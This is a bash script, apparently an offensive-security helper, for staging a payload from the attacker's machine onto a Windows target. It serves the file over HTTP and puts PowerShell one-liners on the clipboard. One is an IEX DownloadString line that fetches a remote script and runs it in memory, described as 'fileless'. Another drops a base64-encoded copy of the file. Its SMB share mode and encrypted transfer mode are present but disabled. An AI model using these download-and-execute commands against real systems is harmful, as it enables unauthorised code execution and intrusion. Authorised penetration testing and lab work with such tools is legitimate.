#!/usr/bin/env bash
set -euo pipefail
# Define colors
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
BOLD_WHITE="\e[1;37m"
WHITE="\e[37m"
BRIGHT_WHITE="\e[97m"
RESET="\e[0m"
COLOR=$BRIGHT_WHITE


FILE="${1:-}"
CASE="${2:-http}"
ARG3="${3:-}"   # port for http|fileless|encrypted; share for smb

if [[ -z "$FILE" || ! -f "$FILE" ]]; then
  echo -e "Usage: $(basename "$0") <file> [${GREEN}http${COLOR}|${GREEN}fileless${COLOR}|${RED}smb${COLOR}|${RED}encrypted${COLOR}|${GREEN}offline${COLOR}] [port_or_share]" >&2
  echo "Examples:"
  echo "  $(basename "$0") <file>                   # http on 8000"
  echo "  $(basename "$0") <file> http 4444         # http on 8000"
  echo "  $(basename "$0") <file>.ps1 fileless      # fileless"
  echo "  $(basename "$0") <file> encrypted         # enc -> serve"
  echo "  $(basename "$0") <file> smb dropshare     # SMB (requires root for 445)"
  echo "  $(basename "$0") <file> offline           # one-line paste for target"
  exit 1
fi

IP="${IP:-}"


# 1) try tun0 if not provided
if [[ -z "$IP" ]]; then
  IP="$( ip -br addr show dev tun0 2>/dev/null \
        | awk '{print $3}' | cut -d/ -f1 || true )"
  [[ -n "$IP" ]]
fi


# 2) default-route source IP
if [[ -z "$IP" ]]; then
  IP="$( ip route get 1.1.1.1 2>/dev/null \
        | awk '{for(i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}' || true )"
  [[ -n "$IP" ]]
fi

# 3) first non-loopback global IPv4
if [[ -z "$IP" ]]; then
  IP="$( ip -4 -br addr show scope global 2>/dev/null \
        | awk '{print $3}' | cut -d/ -f1 | head -n1 || true )"
  [[ -n "$IP" ]]
fi


if [[ -z "$IP" ]]; then
  echo "[-] Could not determine an attacker/machine IP. Export \$IP, connect VPN (tun0), or ensure an interface has an IPv4 address." >&2
  exit 1
fi


BASE="$(basename "$FILE")"
DIR="$(cd "$(dirname "$FILE")" 2>/dev/null || pwd)"

PORT="${ARG3:-8000}"
SHARE="${ARG3:-share}"

# For network servers: low ports need root. Use high default ports on HTTP.
if [[ "$CASE" =~ ^(http|fileless|encrypted)$ ]]; then
  if [[ "$PORT" =~ ^[0-9]+$ ]] && (( PORT < 1024 )) && (( EUID != 0 )); then
    echo "[!] Port ${PORT} requires root. Falling back to 8000."
    PORT=8000
  fi
fi
echo 
case "$CASE" in
  http)
    echo -e "${MAGENTA}=== HTTP ==="
    echo -e "${COLOR}(New-Object Net.WebClient).DownloadFile('http://${IP}:${PORT}/${BASE}','.\\\\${BASE}')"
    echo -e "Invoke-WebRequest http://${IP}:${PORT}/${BASE} -OutFile .\\\\${BASE}"
    echo "Invoke-WebRequest http://${IP}:${PORT}/${BASE} -OutFile .\\\\${BASE}" | xclip -selection clipboard
    echo -e "${GREEN}→ helper copied to clipboard"
    echo
    echo -e "${YELLOW}[*] Serving ${BASE} at http://${IP}:${PORT}/ (Ctrl-C to stop)"
    python3 -m http.server "$PORT" --bind 0.0.0.0
    ;;

  fileless)
    
  
    echo -e "${MAGENTA}=== Fileless ==="
    echo -e "${COLOR}IEX (New-Object Net.WebClient).DownloadString('http://${IP}:${PORT}/${BASE}')"
    echo "IEX (New-Object Net.WebClient).DownloadString('http://${IP}:${PORT}/${BASE}')" | xclip -selection clipboard
    echo -e "${GREEN}→ copied to clipboard"
    # tips if not .ps1
    if [[ ! "$BASE" =~ \.ps1$ ]]; then
      echo "# (Tip) fileless is meant for .ps1 payloads; for binaries use http/smb modes."
    fi
    echo
    echo -e "${YELLOW}[*] Serving ${BASE} at http://${IP}:${PORT}/ (Ctrl-C to stop)"
    python3 -m http.server "$PORT" --bind 0.0.0.0
    ;;

  encrypted)
   
    echo -e ${RED} Not implemented: this action is not available in this build. 
  exit 1
   
    echo -e "${MAGENTA}=== Encrypted ===${COLOR}"
    DIR="$(cd "$(dirname "$FILE")" 2>/dev/null && pwd || pwd)"
    openssl enc -aes256 -pbkdf2 -in "${FILE}" -out "${DIR}/${BASE}.enc"

    echo
    echo "(New-Object Net.WebClient).DownloadFile('http://${IP}:${PORT}/${BASE}.enc','.\\\\${BASE}.enc')"
    echo "(New-Object Net.WebClient).DownloadFile('http://${IP}:${PORT}/${BASE}.enc','.\\\\${BASE}.enc')" | xclip -selection clipboard
    echo -e "${GREEN}→ copied to clipboard${COLOR}"
    echo
    echo "openssl enc -d -aes-256-cbc -pbkdf2 -in ${FILE}.enc -out ${FILE}"

    echo
    echo -e "${YELLOW}[*] Serving ${BASE}.enc at http://${IP}:${PORT}/ (Ctrl-C to stop)"
    python3 -m http.server "$PORT" --bind 0.0.0.0
    ;;

  offline)
    echo -e "${MAGENTA}=== Offline ==="
    ENCODED="$(base64 -w0 "${FILE}")"
    echo -e "${COLOR}\$b64='${ENCODED}'; [IO.File]::WriteAllBytes((Join-Path (Get-Location).Path '${BASE}'), [Convert]::FromBase64String(\$b64))"
    echo "\$b64='${ENCODED}'; [IO.File]::WriteAllBytes((Join-Path (Get-Location).Path '${BASE}'), [Convert]::FromBase64String(\$b64))" | xclip -selection clipboard
    echo -e "${GREEN}→ copied to clipboard"
    ;;

  smb)

      echo -e ${RED} Not implemented: this action is not available in this build. 
      exit 1
    if (( EUID != 0 )); then
      echo "[-] SMB on Windows target requires your server to bind port 445. Run as root (sudo) or use http mode." >&2
      exit 1
    fi
    
    
    exit 1
    echo "=== On TARGET (map & copy) ==="
    echo "copy \\\\${IP}\\${SHARE}\\${BASE} C:\\Users\\Public\\${BASE}"
    echo "# Or, if guest blocked:"
    echo "net use n: \\\\${IP}\\${SHARE} /user:user pass"
    echo "copy n:\\${BASE} C:\\Users\\Public\\${BASE}"
    echo
    echo "[*] Exporting SMB share \"${SHARE}\" from ${DIR} on 445 (Ctrl-C to stop)"
    cd "$DIR"
    if command -v impacket-smbserver >/dev/null 2>&1; then
      impacket-smbserver "${SHARE}" . -smb2support
    else
      python3 -m impacket.smbserver "${SHARE}" . -smb2support
    fi
    ;;

  *)
    echo "[-] Unknown case: ${CASE}. Use: http|fileless|smb|encrypted|offline" >&2; exit 1 ;;
esac

